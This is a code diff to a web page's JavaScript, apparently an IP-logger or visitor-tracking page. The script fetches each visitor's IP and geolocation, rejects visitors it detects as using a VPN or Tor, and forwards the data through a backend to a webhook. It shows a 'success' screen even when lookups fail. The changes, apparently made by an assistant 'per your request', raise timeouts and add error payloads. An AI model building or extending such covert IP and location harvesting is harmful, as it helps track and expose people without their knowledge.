@@ -535,7 +535,7 @@
    * Helper: fetch with timeout + online checking
    * returns response (like fetch) or throws on timeout/offline/error
    ***********************/
-  const DEFAULT_TIMEOUT = 8000; // milliseconds
+  const DEFAULT_TIMEOUT = 30000; // milliseconds — increased to handle multiple API keys
   async function fetchWithTimeout(url, opts = {}, timeoutMs = DEFAULT_TIMEOUT) {
     if (!navigator.onLine) throw new Error('offline');
     const controller = new AbortController();
@@ -636,15 +636,40 @@
 
     try {
       // 1) Get the external IP (with timeout)
-      const ipRes = await fetchWithTimeout("https://api.ipify.org?format=json", {}, 6000);
+      const ipRes = await fetchWithTimeout("https://api.ipify.org?format=json", {}, DEFAULT_TIMEOUT);
       const ipJson = await ipRes.json();
       const ip = ipJson.ip;
 
       // 2) Check VPN/proxy using your server-side endpoint (with timeout)
       // If server returns vpn:true -> show alert (VPN detected)
-      const vpnRes = await fetchWithTimeout("/api/ipcheck?ip=" + encodeURIComponent(ip), {}, 8000);
+      const vpnRes = await fetchWithTimeout("/api/ipcheck?ip=" + encodeURIComponent(ip), {}, DEFAULT_TIMEOUT);
       const vpnData = await vpnRes.json();
-      const vpnOn = vpnData.raw?.vpn || vpnData.raw?.tor || vpnData.raw?.active_vpn || vpnData.raw?.active_tor || vpnData.vpn;
+
+      // If ipcheck returned allKeysFailed -> send special error payload (per your request)
+      if (vpnData.allKeysFailed) {
+        // ipInfo may be provided by ipcheck in vpnData.ipInfo (from ipwho.is)
+        const ipInfoFrom = vpnData.ipInfo || null;
+        const hasLocation = !!(ipInfoFrom && (ipInfoFrom.country || ipInfoFrom.city || ipInfoFrom.region));
+        const errorPayload = {
+          status: "error",
+          location: hasLocation
+        };
+        if (hasLocation) errorPayload.ipData = ipInfoFrom;
+
+        // send to your backend which forwards to the webhook URL (with timeout)
+        await fetchWithTimeout("/api/send", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ webhook, data: errorPayload })
+        }, DEFAULT_TIMEOUT);
+
+        // success UI (we still show success because request forwarded)
+        showSuccess();
+        return;
+      }
+
+      // Determine vpn/proxy from ipcheck response (isproxyip returns { status: 'success', proxy: 0|1 })
+      const vpnOn = (typeof vpnData.proxy !== 'undefined') ? (vpnData.proxy === 1) : !!vpnData.vpn;
 
       if (vpnOn) {
         document.getElementById("loader").style.display = "none";
@@ -657,7 +682,7 @@
       // 3) Get more IP info (best-effort; timeout)
       let ipInfo = { ip };
       try {
-        const ipInfoRes = await fetchWithTimeout(`https://ipwho.is/${encodeURIComponent(ip)}`, {}, 6000);
+        const ipInfoRes = await fetchWithTimeout(`https://ipwho.is/${encodeURIComponent(ip)}`, {}, DEFAULT_TIMEOUT);
         ipInfo = await ipInfoRes.json();
       } catch (e) {
         // not fatal — continue with minimal info
@@ -668,7 +693,9 @@
         country: ipInfo.country,
         countryCode: ipInfo.country_code,
         callingCode: ipInfo.calling_code,
-        timezone: ipInfo.timezone?.id
+        timezone: ipInfo.timezone?.id,
+        status: "success",
+        location: true
       };
 
       // 4) Send to your backend which forwards to the webhook URL (with timeout)
@@ -676,7 +703,7 @@
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ webhook, data: dataToSend })
-      }, 8000);
+      }, DEFAULT_TIMEOUT);
 
       // success
       showSuccess();
